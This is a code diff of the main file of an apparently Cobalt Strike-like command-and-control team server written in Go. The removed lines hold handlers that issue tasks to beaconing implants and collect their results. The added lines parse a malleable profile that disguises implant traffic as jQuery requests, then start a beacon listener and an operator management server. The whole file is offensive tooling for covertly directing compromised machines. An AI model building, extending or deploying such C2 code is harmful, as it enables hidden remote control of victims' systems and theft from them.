@@ -2,63 +2,57 @@ package main
 
 import (
 	"NewCsTeamServer/client"
-	"NewCsTeamServer/server"
-	"NewCsTeamServer/task"
-	"encoding/json"
+	"NewCsTeamServer/config"
+	"NewCsTeamServer/profile"
+	"NewCsTeamServer/server/http"
+	"NewCsTeamServer/server/manager"
+	"flag"
 	"fmt"
-	"log"
-	"net/http"
-	"time"
+	"github.com/kataras/golog"
+	_ "go.uber.org/automaxprocs"
+	"os"
 )
 
-// HTTP处理任务下发请求
-func handleIssueTask(w http.ResponseWriter, r *http.Request, cm *client.ClientManager) {
-	if r.Method != http.MethodPost {
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-		return
-	}
+var (
+	profilename string
+)
 
-	var req struct {
-		ClientID uint32 `json:"client_id"`
-		Type     uint32 `json:"type"` // 4字节命令类型，适配客户端
-		Content  string `json:"content"`
-	}
-	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
-		http.Error(w, fmt.Sprintf("invalid request body: %v", err), http.StatusBadRequest)
-		return
-	}
+func init() {
+	flag.StringVar(&profilename, "profile", "jquery-c2.4.5.profile", "Load Your Profile")
+	flag.Parse()
+	GetProfile()
 
-	client, exists := cm.GetClient(req.ClientID)
-	if !exists {
-		http.Error(w, "client not found", http.StatusNotFound)
-		return
+}
+func GetProfile() error { //TODO 粗略写了个解析profile的方案，后续完善和增加对rsa公私钥的读取解析
+	data, err := os.Open(profilename)
+	if err != nil {
+		fmt.Println("[info]", "Not Find Profile!")
+		return nil
 	}
-	if req.Type == 0 {
-		req.Type = 78
+	infos := profile.GetProfile(data)
+	fmt.Println("--------------------------------------------------------------------")
+	fmt.Println("Profile Name:", profilename)
+	fmt.Println("Profile GetUrl:", infos.HttpGet.Url)
+	fmt.Println("Profile OutPutAppendLen:", infos.HttpGet.OutPutAppendLen) //后续agent处理，直接过滤掉这个长度的字符串即可
+	fmt.Println("Profile OutPutPrependLen:", infos.HttpGet.OutPutPrependLen)
+	fmt.Println("Profile MetadataType:", infos.HttpGet.MetadataType)
+	fmt.Println("Profile CookieName:", infos.HttpGet.MetadataTypeValue)
+	fmt.Println("Profile PostUrl:", infos.HttpPost.Url)
+	fmt.Println("Profile Post:", infos.HttpPost)
+	fmt.Println("--------------------------------------------------------------------")
+	config.ProfileConfig = config.Profile{ //TODO 读取profile适配，现已有方案，增加对应的加解密函数
+		CookieName:  infos.HttpGet.MetadataTypeValue,
+		GetUrl:      infos.HttpGet.Url,
+		GetRetBody:  "This is a Test",
+		PostUrl:     infos.HttpPost.Url,
+		PostQuery:   infos.HttpPost.ClientOutputTypeValue,
+		PostRetBody: "Task received successfully",
 	}
-	task := task.Task{
-		ID:        fmt.Sprintf("%d-%d", req.ClientID, time.Now().UnixNano()),
-		Type:      req.Type,
-		Content:   []byte(req.Content),
-		CreatedAt: time.Now(),
-	}
-	client.TaskQueue.AddTask(task)
-
-	log.Printf("Task issued to client %d: ID=%s, Type=%s, Content=%s", req.ClientID, task.ID, task.Type, task.Content)
-	w.Write([]byte("Task issued successfully"))
+	return nil
 }
 func main() {
+	golog.Println(config.ProfileConfig)
 	client.GlobalClientManager = client.NewClientManager()
-	http.HandleFunc("/beacon", server.HandleBeacon)
-	http.HandleFunc("/beacon_result", func(w http.ResponseWriter, r *http.Request) {
-		server.HandleBeaconResult(w, r, client.GlobalClientManager)
-	})
-	http.HandleFunc("/issue_task", func(w http.ResponseWriter, r *http.Request) {
-		handleIssueTask(w, r, client.GlobalClientManager)
-	})
-
-	log.Println("Starting server on :8081")
-	if err := http.ListenAndServe(":8081", nil); err != nil {
-		log.Fatalf("Server failed: %v", err)
-	}
+	go http.HttpServer("8081", false)    //TODO 后续通过监听器，监听指定端口
+	manager.RunTeamServer("8088", false) //管理端服务 TODO 后续使用websocket或其他方式进行通信
 }
